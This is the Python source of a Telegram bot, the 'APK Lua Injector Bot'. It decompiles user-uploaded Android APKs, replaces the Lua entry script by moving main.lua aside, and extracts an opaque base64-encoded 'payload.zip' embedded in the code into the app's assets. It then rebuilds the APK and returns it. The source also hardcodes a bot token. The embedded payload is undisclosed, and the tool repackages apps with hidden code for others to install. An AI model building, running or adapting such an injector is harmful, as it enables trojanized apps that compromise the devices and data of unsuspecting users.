import os
import telebot
import subprocess
import shutil
import zipfile
import base64
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==========================================
# CONFIGURATION & DATA STRINGS
# ==========================================
BOT_TOKEN = "8877502937:AAGRGZ-dCEQw9IPZ3UCzDkDzcda6WOHgwhA"
BOT_DISPLAY_NAME = "APK Lua Injector Bot"
BUTTON_TEXT = "🚀 Run APK Process"

EMBEDDED_DATA = """IA58SkRPwZBK8gCQRsAcpuqRMvbbrIQa5kG40dncGqHNQNinyRd7Ah7UP4WD88QXcwYcI00v3df1Msx4lgc1cnIp9IH+h7OnvjG+AeEglILUArLPxg+L0fsZ+U1LTUz6+JVQF9nhrX21jOvvfPakCzvkjd/7kL1RG4WFpXg31g30HvY18d3KtIVljnw0ymk6GhqylFIQQh2vwJ/UP1PMBHsTZq7VI4JAuK/y0RM5ycoHdHDLnQ49nl+FQOV0U978Do+T5TaMTR4fNa2M5IDJkALEmkDNgI342j4vGko2C74mmOTEbkxrMuOiPiUVsuy7SbI2B5hd6BQGvj5ulpKeTf+ryk4b8jFYL2LK6vhQsDCOu3fJhkXevvdHj5QMvFNsY6qs7J02ma2om1lYSFua3MyMF8day687nlk3B+KDrrV4ri6GlQaVM5rTAWhXQ/EtZYS85He2psR0rvOR/MVwcmrYkVUS72DNjYP0Va+RdU1GgbJ/lVtq6ucldZkowVrSMP7TFTbY6MnglxXQBGQRKWqXfmJbku3cYLwgTPhA/XXTyVLxPw4Bt2/XWyZuCSLmLQRtUtVhIEXUtlk0A3I3GIulXLgsyUWnrhqFXASieAPtTwhap1erz09fcgUms7txVZGPsOPFUhnzy7HBYv8hjZvietm5/LKFOVXiqncZos0hpqa2XdGrF7NyJd+X4X7NgEjzy1UDLUIbMgTqWZLVXTx7RDL8UIWBbcsGhXFV0xKSC5H8rQqf6m7W9iBgGWKE+mVTREF7vanfe41AmPIobmjRD0aMI99xpJAjcdjqJhV//Q2TAWXgg2GBgV3yrgFe+nMuxAL0PBBoy1vJouKhT03So3fVqZtu9b1MQwp/MYTZp3hNONFukmR6sk7qaPlh5v1A4FtGlGhk83cne/5Usj8ktYZrkgNlUYCt8A4EhAKQtaNb5fdT+Rkh6afg/2A3rdvPOqleJvmoKfGRn6ggfPqMceBe6iDxHu9ggKi+KLDXpKv5K7XcSz3nbmN5ehNpeVNJDQvWDZpMlDXfWQmpo5cYOZbzvDk/mlcjcpZdU15knBvdxxyDA6DID1LKwFeSicq0UBNKkdfDcsA778hPz9EsUR571r5JGEYkfaMySZOh0/5A3HMmd1txM+d8nVQsRqmtnq51lh6dC45Ohst74PO4asBy8Fofrptr9dQFqQ4y3nRu9Mnzcc8540nW9oIIJ0+CoDjJwD5zwp+5Dagv8f1oKfqKCmmTYV78Rl11vjp3/oj1OEbLwDKJKYTZrPWptY6UYC5Ru6JI0P14ix7GJtPcO+5Wr4lO1PhOgIR7MWlQbhzlwWPD1VAYHwBWtMY6uLaiDCL0AJcQ=="""

ZIP_OUTPUT_NAME = "payload.zip"
user_states = {}

bot = telebot.TeleBot(BOT_TOKEN)

def setup_extracted_file():
    try:
        file_data = base64.b64decode(EMBEDDED_DATA)
        with open(ZIP_OUTPUT_NAME, "wb") as f:
            f.write(file_data)
        print(f"[✓] Created payload file: {ZIP_OUTPUT_NAME}")
    except Exception as e:
        print(f"[X] Failed to unpack embedded data: {e}")

def process_apk(input_path, output_path, chat_id):
    decode_dir = f"decompile_{chat_id}"
    
    if not os.path.exists("apktool.jar"):
        bot.send_message(chat_id, "❌ Critical Server Error: `apktool.jar` is missing from the host folder.")
        return False
        
    try:
        bot.send_message(chat_id, "🔧 Unpacking APK layout...")
        decompile_cmd = ["java", "-jar", "apktool.jar", "d", input_path, "-o", decode_dir, "-f"]
        subprocess.run(decompile_cmd, check=True)
        
        assets_path = os.path.join(decode_dir, "assets")
        if not os.path.exists(assets_path):
            os.makedirs(assets_path)
            
        old_lua = os.path.join(assets_path, "main.lua")
        new_lua = os.path.join(assets_path, "main1.lua")
        
        if os.path.exists(old_lua):
            os.rename(old_lua, new_lua)
            bot.send_message(chat_id, "📝 Found and renamed main.lua -> main1.lua")
        else:
            bot.send_message(chat_id, "ℹ️ Original main.lua was not found; skipped renaming step.")

        if os.path.exists(ZIP_OUTPUT_NAME):
            bot.send_message(chat_id, "📦 Extracting your custom bundle into /assets...")
            with zipfile.ZipFile(ZIP_OUTPUT_NAME, 'r') as zip_ref:
                zip_ref.extractall(assets_path)
        else:
            bot.send_message(chat_id, "❌ Error: Extracted payload script zip file went missing.")
            return False

        bot.send_message(chat_id, "🏗️ Rebuilding the modified APK package...")
        rebuild_cmd = ["java", "-jar", "apktool.jar", "b", decode_dir, "-o", output_path]
        subprocess.run(rebuild_cmd, check=True)
        
        return True

    except Exception as e:
        bot.send_message(chat_id, f"❌ System execution error: {str(e)}")
        return False
        
    finally:
        if os.path.exists(decode_dir):
            shutil.rmtree(decode_dir)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = f"Welcome to **{BOT_DISPLAY_NAME}**.\n\nClick the option below to initialize an APK modification sequence."
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(text=BUTTON_TEXT, callback_data="await_apk"))
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "await_apk")
def handle_inline_click(call):
    chat_id = call.message.chat.id
    user_states[chat_id] = "EXPECTING_APK"
    bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="📥 Send the **.apk** file you want to edit now.")

@bot.message_handler(content_types=['document'])
def handle_incoming_file(message):
    chat_id = message.chat.id
    
    if user_states.get(chat_id) == "EXPECTING_APK":
        file_name = message.document.file_name
        
        if not file_name.lower().endswith('.apk'):
            bot.send_message(chat_id, "❌ Invalid file type. Please upload a file ending with `.apk`.")
            return
            
        bot.send_message(chat_id, "⏳ Downloading your APK to our compiler backend...")
        
        input_file = f"raw_{chat_id}.apk"
        output_file = f"mod_{chat_id}.apk"
        
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded = bot.download_file(file_info.file_path)
            
            with open(input_file, 'wb') as f:
                f.write(downloaded)
                
            success = process_apk(input_file, output_file, chat_id)
            
            if success and os.path.exists(output_file):
                bot.send_message(chat_id, "📤 Uploading finished APK back to you...")
                with open(output_file, 'rb') as final_apk:
                    bot.send_document(chat_id, final_apk, visible_file_name=f"modified_{file_name}")
            else:
                bot.send_message(chat_id, "❌ Process failed. Could not build output archive.")
                
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error handling file: {str(e)}")
            
        finally:
            if os.path.exists(input_file): os.remove(input_file)
            if os.path.exists(output_file): os.remove(output_file)
            user_states[chat_id] = None
    else:
        bot.send_message(chat_id, "Please use the /start command menu buttons to process a file.")

if __name__ == "__main__":
    setup_extracted_file()
    print(f"Starting {BOT_DISPLAY_NAME} engine loop...")
    bot.infinity_polling()